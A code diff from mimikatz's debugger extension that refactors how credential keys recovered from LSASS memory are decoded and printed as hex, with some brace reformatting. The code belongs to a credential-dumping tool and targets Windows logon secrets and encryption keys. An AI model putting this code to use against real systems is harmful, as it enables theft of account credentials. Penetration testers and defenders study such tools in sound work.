@@ -213,21 +213,24 @@ DECLARE_API(mimikatz)
 							LocalFree(LogonSessionList);
 						}
 					}
-				} else dprintf("[ERROR] [LSA] Symbols\n%p - lsasrv!LogonSessionListCount\n%p - lsasrv!LogonSessionList\n", pLogonSessionListCount, pLogonSessionList);
-			} else dprintf("[ERROR] [CRYPTO] Acquire keys");
-		} else dprintf("[ERROR] [CRYPTO] Symbols\n%p - lsasrv!InitializationVector\n%p - lsasrv!hAesKey\n%p - lsasrv!h3DesKey\n", pInitializationVector, phAesKey, ph3DesKey);
+				}
+				else dprintf("[ERROR] [LSA] Symbols\n%p - lsasrv!LogonSessionListCount\n%p - lsasrv!LogonSessionList\n", pLogonSessionListCount, pLogonSessionList);
+			}
+			else dprintf("[ERROR] [CRYPTO] Acquire keys");
+		}
+		else dprintf("[ERROR] [CRYPTO] Symbols\n%p - lsasrv!InitializationVector\n%p - lsasrv!hAesKey\n%p - lsasrv!h3DesKey\n", pInitializationVector, phAesKey, ph3DesKey);
 		kuhl_m_sekurlsa_nt6_LsaCleanupProtectedMemory();
-	} else dprintf("[ERROR] [CRYPTO] Init\n");
+	}
+	else dprintf("[ERROR] [CRYPTO] Init\n");
 }
 
 UNICODE_STRING uNull = {12, 14, L"(null)"};
 VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PLUID luid, ULONG flags)
 {
 	PUNICODE_STRING username = NULL, domain = NULL, password = NULL;
-	PRPCE_CREDENTIAL_KEYCREDENTIAL pRpceCredentialKeyCreds;
+	PKIWI_CREDENTIAL_KEYS pKeys = NULL;
 	PKERB_HASHPASSWORD_6 pHashPassword;
 	UNICODE_STRING buffer;
-	PVOID base;
 	DWORD type, i;
 	BOOL isNull = FALSE;
 	PBYTE msvCredentials;
@@ -271,10 +274,12 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					else kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) (msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT)));
 					break;
 				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
-					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) msvCredentials;
-					base = (PBYTE) pRpceCredentialKeyCreds + sizeof(RPCE_CREDENTIAL_KEYCREDENTIAL) + (pRpceCredentialKeyCreds->unk0 - 1) * sizeof(MARSHALL_KEY);
-					for (i = 0; i < pRpceCredentialKeyCreds->unk0; i++)
-						kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key[i], &base);
+					if(kull_m_rpc_DecodeCredentialKeys(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length, &pKeys))
+					{
+						for(i = 0; i < pKeys->count; i++)
+							kuhl_m_sekurlsa_genericKeyOutput(&pKeys->keys[i]);
+						kull_m_rpc_FreeCredentialKeys(&pKeys);
+					}
 					break;
 				default:
 					dprintf("\n\t * Raw data : ");
@@ -396,7 +401,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 	else dprintf("LUID KO\n");
 }
 
-VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase)
+VOID kuhl_m_sekurlsa_genericKeyOutput(PKIWI_CREDENTIAL_KEY key)
 {
 	switch(key->type)
 	{
@@ -415,8 +420,7 @@ VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase)
 	default:
 		dprintf("\n\t * %08x : ", key->type);
 	}
-	kull_m_string_dprintf_hex((PBYTE) *dirtyBase + sizeof(ULONG), key->size, 0);
-	*dirtyBase = (PBYTE) *dirtyBase + sizeof(ULONG) + *(PULONG) *dirtyBase;
+	kull_m_string_dprintf_hex(key->pbData, key->cbData, 0);
 }
 
 VOID kuhl_m_sekurlsa_genericLsaIsoOutput(PLSAISO_DATA_BLOB blob)
